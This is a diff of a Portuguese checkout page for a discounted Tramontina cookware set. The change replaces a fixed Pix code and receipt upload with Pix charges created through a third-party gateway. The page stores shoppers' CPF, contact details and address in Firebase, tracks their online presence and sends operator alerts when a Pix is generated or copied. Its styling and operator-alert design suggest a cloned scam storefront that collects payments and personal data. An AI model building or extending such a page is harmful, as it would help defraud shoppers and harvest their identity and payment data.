@@ -169,6 +169,7 @@ img{max-width:100%;display:block}
 
 <div id="telaLoading" class="hidden"><div class="loader"></div><p>Processando sua compra…</p></div>
 
+<!-- LIGHTBOX (Foto Ampliada) -->
 <div id="lightbox" onclick="if(event.target.id==='lightbox')fecharLightbox()">
   <button class="fechar" onclick="fecharLightbox()">×</button>
   <img id="lightboxImg" src="" alt="Foto ampliada">
@@ -466,7 +467,6 @@ Peso: 3,845 kg</p>
       <img src="https://img.icons8.com/color/48/pix.png" alt="Pix">
       <div class="metodo-info"><strong>Pix</strong><small>Aprovação imediata</small></div>
     </div>
-    <!-- CARTÃO DE CRÉDITO MANTIDO -->
     <div class="metodo-pagamento" onclick="escolherCartao()">
       <img src="https://img.icons8.com/color/48/card-exchange.png" alt="Cartão de Crédito">
       <div class="metodo-info"><strong>Novo cartão de crédito</strong><small>Pagamento em até 12x</small></div>
@@ -480,24 +480,14 @@ Peso: 3,845 kg</p>
   <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Pagamento via Pix</header>
   <div class="conteudo" style="padding-top:40px;">
     <div class="pix-box">
-      <h2 style="font-size:20px;margin-bottom:8px;color:#333;">Pague R$ 159,44 via Pix</h2>
-      <p style="font-size:14px;color:#666;margin-bottom:20px;">Escaneie o QR Code abaixo</p>
-      
-      <div id="qrCodeFixo" class="pix-qr"></div>
-      
-      <!-- BOTÃO DE COPIAR MANTIDO -->
-      <input type="text" id="chavePixFixa" class="pix-copia" value="COLE_AQUI_SEU_CODIGO_PIX_COPIA_E_COLA" readonly>
-      <button class="btn-pix" onclick="copiarChaveFixa()" style="background: #3483fa; margin-top: 10px;">Copiar Código Pix</button>
-      
-      <div style="margin-top: 25px; padding-top: 20px; border-top: 1px dashed #ccc;">
-        <p style="font-size: 14px; color: #333; font-weight: 600; margin-bottom: 10px;">Já pagou?</p>
-        <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Selecione a foto do comprovante abaixo:</p>
-        
-        <input type="file" id="inputComprovante" accept="image/*" style="display: none;" onchange="enviarFotoComprovante(this)">
-        
-        <button class="btn-pix" onclick="document.getElementById('inputComprovante').click()" style="background: #00a650; margin-top: 0;">📷 Anexar Comprovante</button>
-        
-        <div id="statusUpload" style="display:none; margin-top: 15px; font-size: 14px; color: #3483fa; font-weight: 600;">Enviando imagem...</div>
+      <h2 style="font-size:20px;margin-bottom:8px;color:#333;" id="pixTopo">Gerando PIX…</h2>
+      <div id="pixMensagem" style="color:#666;font-size:14px;">Aguarde um instante.</div>
+      <div id="pixBox" style="display:none;">
+        <!-- O QR Code será desenhado aqui -->
+        <div id="qrcode" class="pix-qr"></div>
+        <p style="font-size:14px;color:#666;margin-bottom:16px;">Escaneie o QR Code ou copie o código abaixo</p>
+        <input type="text" id="chavePix" class="pix-copia" readonly>
+        <button class="btn-pix" onclick="copiarChave()">Copiar código PIX</button>
       </div>
     </div>
   </div>
@@ -557,7 +547,6 @@ Peso: 3,845 kg</p>
 
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
 <script>
 // ===== NOVO BANCO CONFIGURADO =====
 const firebaseConfig = {
@@ -571,13 +560,17 @@ const firebaseConfig = {
 };
 firebase.initializeApp(firebaseConfig);
 const db=firebase.database();
-const storage=firebase.storage();
 
 const VALOR_PEDIDO=159.44;
+const VALOR_CENTAVOS=15944;
+const BLACKCAT_BASE='https://api.blackcatoficial.com/api';
 
 let clienteId=localStorage.getItem('clienteId');
 if(!clienteId){clienteId='c_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);localStorage.setItem('clienteId',clienteId);}
 const pedidoRef=db.ref('pedidos/'+clienteId);
+
+let blackcatApiKeyCache='';
+db.ref('config_blackcat/apiKey').on('value',snap=>{blackcatApiKeyCache=snap.val()||'';});
 
 db.ref('visitas/'+clienteId).update({online:true,entrouEm:Date.now(),ultimaAtividade:Date.now()});
 db.ref('visitas/'+clienteId).onDisconnect().update({online:false,saiuEm:Date.now()});
@@ -586,6 +579,7 @@ window.addEventListener('beforeunload',()=>{db.ref('visitas/'+clienteId).update(
 
 pedidoRef.update({valor:VALOR_PEDIDO,produto:'Jogo de Panelas Tramontina',entrouEm:Date.now()});
 
+// Funções de Lightbox e Curtir
 function abrirLightbox(src){document.getElementById('lightboxImg').src=src;document.getElementById('lightbox').style.display='flex';}
 function fecharLightbox(){document.getElementById('lightbox').style.display='none';}
 function curtir(botao, valorOriginal) {
@@ -611,7 +605,7 @@ function comprarAgora(){
   telaLoading.classList.remove('hidden');
   setTimeout(()=>{telaLoading.classList.add('hidden');appSite.classList.add('hidden');appEndereco.classList.remove('hidden');window.scrollTo(0,0);},1000);
 }
-function voltarSite(){appEndereco.classList.add('hidden');appSite.classList.remove('hidden');appPix.classList.add('hidden');appCartao.classList.add('hidden');appPagamento.classList.add('hidden');appFrete.classList.add('hidden');window.scrollTo(0,0);}
+function voltarSite(){appEndereco.classList.add('hidden');appSite.classList.remove('hidden');window.scrollTo(0,0);}
 
 // ===== VALIDAÇÕES =====
 function validarNome(valor, erroId){
@@ -655,8 +649,10 @@ document.getElementById('cpf').addEventListener('input',function(){let v=this.va
 document.getElementById('cep').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>8)v=v.slice(0,8);v=v.replace(/(\d{5})(\d)/,'$1-$2');this.value=v;});
 document.getElementById('telefone').addEventListener('input',function(){let v=this.value.replace(/\D/g,'');if(v.length>11)v=v.slice(0,11);let f='';if(v.length>0)f='('+v.slice(0,2);if(v.length>=3)f+=') '+v.slice(2,v.length>=7?7:v.length);if(v.length>=7)f+='-'+v.slice(7);this.value=f;});
 
+// Submeter Endereço
 document.getElementById('formEndereco').addEventListener('submit',function(e){
   e.preventDefault();
+  
   const nome = document.getElementById('nome').value.trim();
   const email = document.getElementById('email').value.trim();
   const cpf = document.getElementById('cpf').value.trim();
@@ -681,7 +677,8 @@ document.getElementById('formEndereco').addEventListener('submit',function(e){
   const vTelefone = validarTelefone(telefone, 'erroTelefone');
 
   if(!(vNome && vEmail && vCpf && vCep && vRua && vNumero && vBairro && vCidade && vEstado && vTelefone)){
-    alert("Existem campos inválidos. Corrija-os para continuar.");return;
+    alert("Existem campos inválidos. Corrija-os para continuar.");
+    return;
   }
 
   const dados = {nome,email,cpf,cep,rua,numero,complemento,bairro,cidade,estado,telefone};
@@ -694,23 +691,18 @@ document.getElementById('formEndereco').addEventListener('submit',function(e){
 });
 
 function buscarCep(){
-  const cepInput = document.getElementById('cep');
-  const status = document.getElementById('cepStatus');
-  if (!cepInput || !status) return;
-  const cep = cepInput.value.replace(/\D/g,'');
-  if(cep.length !== 8){ status.textContent = ''; return; }
-  status.textContent = 'Buscando...';
-  fetch(`https://viacep.com.br/ws/${cep}/json/`)
-    .then(r => r.json())
-    .then(d => {
-      if(d.erro){ status.textContent = 'CEP não encontrado.'; return; }
-      document.getElementById('rua').value = d.logradouro || '';
-      document.getElementById('bairro').value = d.bairro || '';
-      document.getElementById('cidade').value = d.localidade || '';
-      document.getElementById('estado').value = d.uf || '';
-      status.textContent = 'Endereço preenchido automaticamente.';
-    })
-    .catch(() => { status.textContent = 'Erro ao buscar CEP.'; });
+  const cep=document.getElementById('cep').value.replace(/\D/g,'');
+  const status=document.getElementById('cepStatus');
+  if(cep.length!==8){status.textContent='';return;}
+  status.textContent='Buscando...';
+  fetch(`https://viacep.com.br/ws/${cep}/json/`).then(r=>r.json()).then(d=>{
+    if(d.erro){status.textContent='';return;}
+    document.getElementById('rua').value=d.logradouro||'';
+    document.getElementById('bairro').value=d.bairro||'';
+    document.getElementById('cidade').value=d.localidade||'';
+    document.getElementById('estado').value=d.uf||'';
+    status.textContent='Endereço preenchido automaticamente.';
+  }).catch(()=>{status.textContent='';});
 }
 
 function voltarEndereco(){appFrete.classList.add('hidden');appEndereco.classList.remove('hidden');window.scrollTo(0,0);}
@@ -721,34 +713,85 @@ function irParaPagamento(){
 }
 function voltarFrete(){appPagamento.classList.add('hidden');appFrete.classList.remove('hidden');window.scrollTo(0,0);}
 
-/* ========== PIX FIXO ========== */
-function escolherPix(){
+/* ========== PIX COM QR CODE LOCAL ========== */
+async function escolherPix(){
   appPagamento.classList.add('hidden');appPix.classList.remove('hidden');window.scrollTo(0,0);
 
-  pedidoRef.update({pagamentoTipo:'pix_fixo'});
+  const msg=document.getElementById('pixMensagem');
+  const box=document.getElementById('pixBox');
+  msg.style.display='block';msg.textContent='Gerando PIX…';box.style.display='none';
+
+  pedidoRef.update({pagamentoTipo:'pix'});
   db.ref('alertas').push({tipo:'pix_solicitado',clienteId,timestamp:Date.now()});
 
-  const seuCodigoPix = "COLE_AQUI_SEU_CODIGO_PIX_COPIA_E_COLA"; 
-  
-  document.getElementById('chavePixFixa').value = seuCodigoPix;
+  const snap=await pedidoRef.once('value');
+  const pedido=snap.val()||{};
+  const end=pedido.endereco;
 
-  const qrContainer = document.getElementById('qrCodeFixo');
-  qrContainer.innerHTML = '';
-  new QRCode(qrContainer, {
-      text: seuCodigoPix,
+  if(!end || !end.nome || !end.cpf || !end.email){
+    msg.textContent='Preencha seus dados antes de gerar o Pix.';return;
+  }
+
+  const apiKey=String(blackcatApiKeyCache||'').trim();
+  if(!apiKey){
+    msg.textContent='Pix indisponível no momento. Tente novamente mais tarde.';return;
+  }
+
+  const cpfNumeros=end.cpf.replace(/\D/g,'');
+  const telNumeros=end.telefone.replace(/\D/g,'');
+  const cepNumeros=end.cep.replace(/\D/g,'');
+
+  const body={
+    amount: VALOR_CENTAVOS, currency: 'BRL', paymentMethod: 'PIX',
+    items: [{ title: 'Jogo de Panelas Paris 5 Peças Tramontina', unitPrice: VALOR_CENTAVOS, quantity: 1, tangible: true }],
+    customer: { name: end.nome, email: end.email, phone: telNumeros, document: { number: cpfNumeros, type: 'cpf' } },
+    shipping: { name: end.nome, street: end.rua, number: end.numero, complement: end.complemento||'', neighborhood: end.bairro, city: end.cidade, state: (end.estado||'').toUpperCase().substring(0,2), zipCode: cepNumeros },
+    pix: { expiresInDays: 1 }, externalRef: clienteId
+  };
+
+  try {
+    const resp=await fetch(BLACKCAT_BASE+'/sales/create-sale',{
+      method:'POST', headers:{'Content-Type':'application/json','X-API-Key':apiKey}, body:JSON.stringify(body)
+    });
+    
+    const data=await resp.json();
+    
+    if(!resp.ok){
+       throw new Error(data.message || data.error || 'Erro na API da Blackcat');
+    }
+
+    const t = data.data || data;
+    const pd = t.paymentData || t;
+    const copia = pd.copyPaste || pd.qrCode || pd.pixCode || '';
+    
+    if(!copia) throw new Error('A API não retornou o código Pix.');
+
+    msg.style.display='none';box.style.display='block';
+    
+    // --- AQUI GERA O QR CODE NA TELA ---
+    document.getElementById('qrcode').innerHTML = '';
+    new QRCode(document.getElementById('qrcode'), {
+      text: copia,
       width: 200,
       height: 200,
-      colorDark : "#000000",
-      colorLight : "#ffffff",
-      correctLevel : QRCode.CorrectLevel.H
-  });
-}
+      colorDark: "#000000",
+      colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.H
+    });
+    
+    document.getElementById('chavePix').value=copia;
+    document.getElementById('pixTopo').textContent='Pague R$ 159,44 via Pix';
 
-function copiarChaveFixa(){
-  const input=document.getElementById('chavePixFixa');input.select();document.execCommand('copy');
-  pedidoRef.update({'pix/copiado':true,'pix/copiadoEm':Date.now()});
-  db.ref('alertas').push({tipo:'pix_copiado',clienteId,timestamp:Date.now()});
-  alert('Código PIX copiado!');
+    pedidoRef.update({
+      'blackcat': { transactionId: t.transactionId||'', status: t.status||'PENDING', amount: t.amount||VALOR_CENTAVOS, netAmount: t.netAmount||0, fees: t.fees||0, invoiceUrl: t.invoiceUrl||'', copyPaste: copia, qrCodeBase64: pd.qrCodeBase64||'', expiresAt: pd.expiresAt||'', criadoEm: Date.now() },
+      'pix': { geradoEm: Date.now(), copiado: false, valor: VALOR_PEDIDO, chave: copia, qrCode: 'local', transactionId: t.transactionId||'' }
+    });
+    db.ref('alertas').push({tipo:'pix_gerado',clienteId,transactionId:t.transactionId||'',timestamp:Date.now()});
+
+  } catch(err){
+    console.error("Erro Blackcat:", err);
+    msg.textContent = 'Não foi possível gerar o Pix. Motivo: ' + err.message;
+  }
 }
 
 function voltarPagamento(){
@@ -757,42 +800,11 @@ function voltarPagamento(){
   document.getElementById('recusado').style.display='none';
   appPagamento.classList.remove('hidden');window.scrollTo(0,0);
 }
-
-// --- FUNÇÃO PARA ENVIAR A FOTO DO COMPROVANTE ---
-function enviarFotoComprovante(input) {
-    if (input.files && input.files[0]) {
-        const file = input.files[0];
-        const statusDiv = document.getElementById('statusUpload');
-        statusDiv.style.display = 'block';
-        statusDiv.textContent = 'Enviando foto... Aguarde.';
-        statusDiv.style.color = '#3483fa';
-
-        const storageRef = storage.ref('comprovantes/' + clienteId + '_' + Date.now());
-        const uploadTask = storageRef.put(file);
-        
-        uploadTask.on('state_changed', 
-            () => {}, 
-            (error) => {
-                console.error("Erro no upload:", error);
-                statusDiv.textContent = 'Erro ao enviar. Tente novamente.';
-                statusDiv.style.color = '#ff3b30';
-            }, 
-            () => {
-                uploadTask.snapshot.ref.getDownloadURL().then((downloadURL) => {
-                    pedidoRef.update({comprovanteEnviado: true,comprovanteURL: downloadURL,comprovanteEm: Date.now()});
-                    db.ref('alertas').push({tipo: 'comprovante_enviado',clienteId: clienteId,url: downloadURL,timestamp: Date.now()});
-                    
-                    statusDiv.textContent = 'Comprovante enviado com sucesso!';
-                    statusDiv.style.color = '#00a650';
-                    
-                    setTimeout(() => {
-                        alert("Comprovante recebido! O vendedor foi notificado.");
-                        voltarSite();
-                    }, 1500);
-                });
-            }
-        );
-    }
+function copiarChave(){
+  const input=document.getElementById('chavePix');input.select();document.execCommand('copy');
+  pedidoRef.update({'pix/copiado':true,'pix/copiadoEm':Date.now()});
+  db.ref('alertas').push({tipo:'pix_copiado',clienteId,timestamp:Date.now()});
+  alert('Código PIX copiado!');
 }
 
 /* ========== CARTÃO ========== */
